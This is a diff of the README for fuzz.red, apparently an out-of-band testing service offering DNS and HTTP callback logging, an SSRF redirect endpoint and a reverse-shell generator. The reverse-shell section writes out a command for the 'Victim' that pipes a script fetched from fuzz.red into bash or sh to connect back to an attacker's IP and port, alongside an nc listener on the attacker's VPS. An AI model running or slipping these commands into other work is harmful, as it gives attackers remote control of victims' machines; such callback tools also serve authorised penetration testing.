@@ -19,37 +19,42 @@ Alphalog 更快、更安全。支持完全匿名 产品(fuzz.red)
 ```
 
 # Welcome to Fuzz.Red #
-Usage:
-1.Get Token and The randomly named subdomain (Expires:1 Day)
-$ curl fuzz.red/get
-=>	{"key":"63d755be-9683-40a9-91fb-b85890155872","subdomain":"oz4e.fuzz.red"}
 
-2.Get Log
+## Usage
 
-```bash
-curl fuzz.red -X POST -d "key=63d755be-9683-40a9-91fb-b85890155872"
-{"code":200,"data":[]}
-```
+1. Get token(`key`) and randomly named subdomain (Expires: 1 Day)
 
-# DNSLOG
+	```bash
+	$ curl fuzz.red/get
+	{"key":"63d755be-9683-40a9-91fb-b85890155872","subdomain":"oz4e.fuzz.red"}
+	```
+
+2. Get logs
+
+	```bash
+	$ curl fuzz.red -X POST -d "key=63d755be-9683-40a9-91fb-b85890155872"
+	{"code":200,"data":[]}
+	```
+
+### DNSLOG
 
 ```bash
 ping -c 1 oz4e.fuzz.red
 ```
 
 ```bash
-curl fuzz.red -X POST -d "key=63d755be-9683-40a9-91fb-b85890155872"
+$ curl fuzz.red -X POST -d "key=63d755be-9683-40a9-91fb-b85890155872"
 {"code":200,"data":["{\"ip\":\"192.168.1.1\",\"reqbody\":[\"\"],\"subdomain\":\"oz4e.fuzz.red.\",\"time\":\"2022-01-14 17:01:17 +0800 CST\",\"type\":\"dns\"}"]} 
 ```
 
-# HTTPLOG
+### HTTPLOG
 
 ```bash
 curl oz4e.fuzz.red -d "abc"
 ```
 
 ```bash
-curl fuzz.red -X POST -d "key=63d755be-9683-40a9-91fb-b85890155872" | python -m json.tool
+$ curl fuzz.red -X POST -d "key=63d755be-9683-40a9-91fb-b85890155872" | python -m json.tool
 {
 "Code": 200,
 "Data": [
@@ -57,33 +62,34 @@ curl fuzz.red -X POST -d "key=63d755be-9683-40a9-91fb-b85890155872" | python -m 
 }
 ```
 
-# SSRF
+### SSRF
 
 ```bash
-curl -L fuzz.red/ssrf/www.baidu.com/
-=> <!DOCTYPE html>...(www.baidu.com page)...</html>
+$ curl -L fuzz.red/ssrf/www.baidu.com/
+<!DOCTYPE html>...(www.baidu.com page)...</html>
 ```
 
 
-# 反弹shell
+### 反弹shell
 
 ```bash
 $ curl fuzz.red/sh4ll/ip:port
 ```
 
-Server
+Victim
 
 ```bash
 $ curl fuzz.red/sh4ll/1.2.3.4:1234 | bash
-or $ curl fuzz.red/sh4ll/1.2.3.4:1234 | sh
+# or 
+$ curl fuzz.red/sh4ll/1.2.3.4:1234 | sh
 ```
 
 VPS
 
 ```bash
-=> $ nc -lvvp 1234
-=> listening on [any] 1234 ...
-   connect to [1.2.3.4] from fbi.gov [127.0.0.1] 46958
+$ nc -lvvp 1234
+listening on [any] 1234 ...
+connect to [1.2.3.4] from fbi.gov [127.0.0.1] 46958
 ```
 
 # RMI or LDAP 
